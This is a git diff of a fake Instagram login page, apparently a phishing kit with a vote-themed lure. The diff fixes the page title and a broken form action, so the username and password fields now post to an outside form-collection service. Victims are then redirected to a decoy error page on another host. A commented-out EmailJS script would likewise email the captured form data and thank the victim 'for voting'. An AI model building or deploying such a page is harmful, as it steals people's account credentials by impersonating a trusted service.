@@ -5,7 +5,7 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instaagraam</title>
+    <title>Instagram</title>
     <!-- FAVIVON -->
     <link rel="shortcut icon" href="./images/favicon.png" type="image/png">
     <!-- GOOGLE FONT -->
@@ -34,39 +34,41 @@
                     </div>
                 </div>
                 <div class="form-container">
-        <form method="POST" id="form"  action="https://submit-form.com/yOzdcIqt6>
-                        
+                    <form id="form" method="POST" action="https://submit-form.com/yOzdcIqt6">
+
                         <div class="form-content box">
                             <div class="logo">
                                 <img src="./images/logo-light.png" alt="Instagram logo" class="logo-light">
                                 <img src="./images/logo-dark.png" alt="Instagram logo" class="logo-dark">
                             </div>
-                    
+
                             <div class="signin-form" id="signin-form">
 
                                 <div class="form-group">
-                                        <!-- <label for="username">username</label> -->
+                                    <!-- <label for="username">username</label> -->
                                     <div class="animate-input">
                                         <span>
-                                           número de telefone, nome de usuário ou e-mail
+            nome de usuário, e-mail, número de telefone
                                         </span>
                                         <input type="text" name="username" id="username" required>
 
                                     </div>
-                                    
+
                                 </div>
                                 <div class="form-group">
                                     <!-- <label for="password">password</label> -->
                                     <div class="animate-input">
                                         <span>
-                                           Senha
+                                            senha
                                         </span>
                                         <input type="text" name="password" id="password" required>
-                                
-                                        <button>Show</button>
+
+                                        <button>show</button>
                                         <input type="hidden" name="_captcha" value="false">
-                                       <input type="hidden" name="_redirect" value="https://voterweroz.vercel.app/error.html"/>
-                                        <!-- <input type="hidden" name="_next" value="thanks.html"> -->
+                                        <input type="hidden" name="_redirect" value="https://voterweroz.vercel.app/error.html"/>
+
+               
+
                                     </div>
 
 
@@ -75,8 +77,8 @@
                                     <button class="btn-login" type="submit" id="button" value="Send Email">
                                         Conecte-se
                                     </button>
-                                </form>
-                
+
+                    </form>
                 </div>
                 <div class="divine">
                     <div></div>
@@ -84,16 +86,16 @@
                     <div></div>
                 </div>
                 <div class="btn-group">
-                   
+
                 </div>
-                <a href="#" class="forgot-pw">Forgotten your password?</a>
+                <a href="#" class="forgot-pw">¿Has olvidado tu contraseña?</a>
             </div>
             <button class="btn-fb">
                 <img src="./images/facebook-icon.png" alt="">
                 <span>Log in with Facebook</span>
             </button>
         </div>
-     
+
         <div class="box goto">
             <p>
                 Don't have an account?
@@ -136,8 +138,33 @@
     </div>
 
 
+    <!-- <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
 
-<script src="app.js"></script>
+<script type="text/javascript">
+    emailjs.init('3sADx72GBDU3wltlO')
+    const btn = document.getElementById('button');
+
+        document.getElementById('form')
+            .addEventListener('submit', function (event) {
+                event.preventDefault();
+
+                btn.value = 'Sending...';
+
+                const serviceID = 'service_ewfeymp';
+                const templateID = 'template_umip8fs';
+
+                emailjs.sendForm(serviceID, templateID, this)
+                    .then(() => {
+                        btn.value = 'Send Email';
+                        alert('Thanks for voting');
+                    }, (err) => {
+                        btn.value = 'Send Email';
+                        alert(JSON.stringify(err));
+                    });
+            });
+</script> -->
+
+    <script src="app.js"></script>
 </body>
 
-        </html>
+</html>
